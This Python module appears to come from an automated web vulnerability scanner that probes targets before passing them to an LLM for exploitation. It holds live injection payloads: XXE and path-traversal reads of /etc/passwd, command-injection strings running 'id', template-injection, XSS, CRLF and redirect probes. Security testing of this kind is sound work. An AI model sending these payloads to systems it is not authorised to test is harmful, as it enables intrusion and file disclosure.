"""Deterministic pre-probe — gate the LLM.

Before spending a model on a specialist, mechanically test each target. Only
signal-positive targets advance to the (expensive) specialist, and the probe tells it
exactly what fired. Machines do detection; the model does reasoning/exploitation. Big
precision + compute win — matters most for weak/local drivers.
"""

from __future__ import annotations

import secrets as _secrets

from owlforge.engine.classify import CRLF, OPEN_REDIRECT, PATH, RCE, SQLI, SSRF, SSTI, XSS, XXE

# classes with a cheap, sound single-request signal. access_control / csrf need a
# differential and are NOT gated here (they pass through to the specialist/validator).
GATEABLE = {SQLI, XSS, PATH, SSRF, SSTI, RCE, OPEN_REDIRECT, CRLF, XXE}


def _http(sandbox, method, url, params, headers):
    try:
        return sandbox.http_request(method or "GET", url, params=params, headers=headers or None)
    except Exception:
        return {}


def _send(sandbox, method, url, param, payload, headers):
    """Send one param=payload WHERE IT BELONGS: query for GET-like methods, a form-encoded
    body for POST/PUT/PATCH — so POST/API endpoints are actually tested, not probed in the
    wrong place (the historical bug that made owlforge blind to body/API params)."""
    m = (method or "GET").upper()
    if sandbox is None:
        return {}
    if m in ("POST", "PUT", "PATCH"):
        from urllib.parse import urlencode
        h = dict(headers or {})
        h["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            return sandbox.http_request(m, url, body=urlencode({param: payload}), headers=h) or {}
        except Exception:
            return {}
    return _http(sandbox, m, url, {param: payload}, headers) or {}


def _xxe_probe(url, method, sandbox, headers):
    """In-band XXE: POST an XML external-entity body that reads /etc/passwd and look for its
    contents in the response. Endpoint-level (no param). Blind XXE is handled by OAST."""
    tok = "owlxxe" + _secrets.token_hex(2)
    xml = ('<?xml version="1.0" encoding="UTF-8"?>\n'
           '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
           f'<r><owl>{tok}</owl><data>&xxe;</data></r>')
    m = (method or "POST").upper()
    if m in ("GET", "HEAD", ""):
        m = "POST"
    h = dict(headers or {})
    h["Content-Type"] = "application/xml"
    try:
        r = sandbox.http_request(m, url, body=xml, headers=h) or {}
    except Exception:
        return False, "", None
    if "root:x:0:0" in (r.get("body") or ""):
        return (True, f"XML external entity resolved file:///etc/passwd at {url}",
                {"param": "(xml body)", "method": m, "payload": xml, "url": url,
                 "success_signal": "root:x:0:0", "title": "XML external entity (XXE) injection",
                 "severity": "high", "where": "body", "content_type": "application/xml"})
    return False, "", None


def probe(cls: str, target: dict, sandbox, session_headers: dict | None = None) -> tuple[bool, str, dict | None]:
    """Return (signal, note). A True signal means the class is worth a specialist on
    this target; note describes what fired (fed to the specialist)."""
    url = target["url"]
    p = target.get("param")
    method = target.get("method", "GET")
    h = session_headers or None
    if sandbox is None:
        return True, "", None
    if cls == XXE:
        return _xxe_probe(url, method, sandbox, h)
    if p is None:
        return True, "", None   # endpoint-level, no param -> don't gate

    is_body = (method or "GET").upper() in ("POST", "PUT", "PATCH")

    def _repro(payload, signal, title, severity):
        rep = {"param": p, "method": method, "payload": payload, "success_signal": signal,
               "title": title, "severity": severity}
        if is_body:
            rep["where"] = "body"
            rep["content_type"] = "application/x-www-form-urlencoded"
        return rep

    if cls == SQLI:
        base = _send(sandbox, method, url, p, "1", h)
        inj = _send(sandbox, method, url, p, "1'", h)
        bs, is_ = int(base.get("status") or 0), int(inj.get("status") or 0)
        if bs and is_ >= 500 and bs < 500:
            return (True, f"{p}: single-quote -> HTTP {is_} vs baseline {bs} (error-based SQLi)",
                    _repro("1'", "500", "SQL injection (error-based)", "high"))
        bl, il = len(base.get("body") or ""), len(inj.get("body") or "")
        if bl and abs(bl - il) / max(bl, il) > 0.3:
            return True, f"{p}: single-quote changed response size {bl}->{il}", None
        return False, "", None

    if cls == XSS:
        m = "owlx" + _secrets.token_hex(3)
        r = _send(sandbox, method, url, p, f"<{m}>", h)
        if f"<{m}>" in (r.get("body") or ""):
            return (True, f"{p}: raw marker <{m}> reflected unencoded (candidate XSS sink)",
                    _repro(f"<{m}>", f"<{m}>", "Reflected XSS", "high"))
        return False, "", None

    if cls == PATH:
        r = _send(sandbox, method, url, p, "../../../../etc/passwd", h)
        if "root:x:0:0" in (r.get("body") or ""):
            return (True, f"{p}: /etc/passwd contents returned (path traversal)",
                    _repro("../../../../etc/passwd", "root:x:0:0", "Path traversal / LFI", "high"))
        return False, "", None

    if cls == SSTI:
        # unique product so a coincidental "49" can't false-positive
        for payload in ("{{1337*1337}}", "${1337*1337}", "<%=1337*1337%>", "#{1337*1337}"):
            r = _send(sandbox, method, url, p, payload, h)
            if "1787569" in (r.get("body") or ""):
                return (True, f"{p}: template evaluated {payload} -> 1787569 (SSTI)",
                        _repro(payload, "1787569", "Server-side template injection", "high"))
        return False, "", None

    if cls == RCE:
        for payload in ("1;id", "1|id", "$(id)", "1&&id", "`id`"):
            r = _send(sandbox, method, url, p, payload, h)
            body = r.get("body") or ""
            if "uid=" in body and "gid=" in body:
                return (True, f"{p}: command injection {payload} -> id output (uid=/gid=)",
                        _repro(payload, "uid=", "OS command injection / RCE", "critical"))
        return False, "", None

    if cls == SSRF:
        mark = f"http://owl-{_secrets.token_hex(3)}.probe/"
        r = _send(sandbox, method, url, p, mark, h)
        hdrs = {k.lower(): str(v) for k, v in (r.get("headers") or {}).items()}
        if mark in hdrs.get("location", ""):
            # the server put our URL in a 3xx Location but did NOT fetch it -> this is an
            # OPEN REDIRECT (CWE-601, medium), not SSRF. Label it correctly; conflating the
            # two over-rated open redirects as high-severity SSRF.
            return (True, f"{p}: attacker URL becomes the 3xx Location (open redirect, not SSRF)",
                    _repro(mark, mark.split("//")[1].rstrip("/"), "Open redirect", "medium"))
        # a URL merely echoed in the body is not proof of a server-side fetch; true SSRF is
        # confirmed out-of-band by the OAST pass (a real callback), so do not claim it here.
        return False, "", None

    if cls == OPEN_REDIRECT:
        from urllib.parse import urlparse as _up
        evil = "https://owl-redir.example/"
        r = _send(sandbox, method, url, p, evil, h)
        hdrs = {k.lower(): str(v) for k, v in (r.get("headers") or {}).items()}
        loc = hdrs.get("location", "")
        if loc and _up(loc).netloc == "owl-redir.example":
            return (True, f"{p}: redirects off-site to {loc} (open redirect)",
                    _repro(evil, "owl-redir.example", "Open redirect", "medium"))
        return False, "", None

    if cls == CRLF:
        r = _send(sandbox, method, url, p, "x\r\nOwl-Inject: owl1", h)
        hdrs = {k.lower(): str(v) for k, v in (r.get("headers") or {}).items()}
        if "owl-inject" in hdrs:
            return (True, f"{p}: CRLF injected a response header (Owl-Inject)",
                    _repro("x\r\nOwl-Inject: owl1", "owl-inject", "CRLF / response-header injection", "medium"))
        return False, "", None

    return True, ""


def filter_targets(cls: str, targets: list[dict], sandbox, session_headers: dict | None = None
                   ) -> tuple[list[dict], list[str], list[dict]]:
    """For a gateable class, return (targets_with_signal, probe_notes, repros). `repros`
    are crisp, deterministically-confirmed findings ready to auto-file (so recall never
    depends on the LLM remembering to file). Non-gateable classes pass through."""
    if cls not in GATEABLE or sandbox is None:
        return targets, [], []
    kept, notes, repros = [], [], []
    for t in targets:
        sig, note, repro = probe(cls, t, sandbox, session_headers)
        if sig:
            kept.append(t)
            if note:
                notes.append(note)
            if repro:
                repro["url"] = t["url"]
                repros.append(repro)
    return kept, notes, repros
